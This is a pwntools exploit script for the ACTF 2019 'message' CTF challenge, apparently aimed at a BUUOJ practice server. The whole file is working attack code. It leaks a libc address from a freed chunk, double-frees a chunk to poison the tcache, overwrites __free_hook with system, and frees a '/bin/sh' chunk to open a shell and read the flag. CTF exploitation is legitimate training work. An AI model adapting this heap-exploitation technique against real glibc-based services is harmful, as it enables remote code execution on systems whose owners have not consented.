from pwn import *
filename="./ACTF_2019_message"
libc_name="/home/nicholas/glibc-all-in-one/libs/buu_libc6_2.27-3ubuntu1_amd64/libc.so.6"
# io = process(filename)
io = remote('node4.buuoj.cn',29698)
context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']


def choice(ch):
    io.sendlineafter('What\'s your choice:',str(ch))

def add(length,con):
    choice(1)
    io.recvuntil('Please input the length of message:')
    io.sendline(str(length))
    io.recvuntil(':\n')
    io.sendline(con)

def edit(index,con):
    choice(3)
    io.recvuntil(':\n')
    io.sendline(str(index))
    io.recvuntil(':')
    io.sendline(con)

def delete(index):
    choice(2)
    io.sendlineafter(':',str(index))

def show(index):
    choice(4)
    io.sendlineafter(':',str(index))

def debug():
    gdb.attach(io,"b *0x400D21")
    show(0)


add(0x418,"aa")#0
add(0x30,"aa")#1
delete(0)
add(0x30,"a"*0x8)#2
show(2)
libc_info = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
success("libc_info: " + hex(libc_info))
libc_base = libc_info - 0x3ec00a
success("libc_base: " + hex(libc_base))
delete(1)
delete(1)
# debug()
add(0x30,p64(libc_base+libc.symbols['__free_hook']))#3
# debug()
add(0x30,"/bin/sh")#4
add(0x30,p64(libc_base + libc.symbols['system']))
# debug()
delete(4)
io.sendline('cat flag')






io.interactive()

